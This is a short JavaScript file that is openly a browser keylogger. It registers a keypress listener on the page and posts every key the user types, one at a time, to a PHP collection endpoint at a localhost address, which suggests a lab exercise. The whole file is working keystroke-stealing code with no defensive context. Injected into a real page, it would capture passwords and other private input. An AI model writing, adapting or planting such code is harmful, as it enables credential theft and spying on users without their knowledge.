var keys = "";
var url = "http://localhost:81/keylogger/keylogger.php";

document.addEventListener("keypress", (e) => {
  key = e.key ? e.key : e.key;
  // // console.log(key);
  // keys += key;
  // // window.setInterval(() => {
  // //   keys = "\n";
  // // }, 3000);
  // console.log(keys);
  sendData(key);
});

const sendData = (data) => {
  let xhr;
  if (window.XMLHttpRequest) xhr = new XMLHttpRequest();
  else xhr = new ActiveXObject("Microsoft.XMLHTTP");
  xhr.open("POST", url, true);
  xhr.send(data);
};
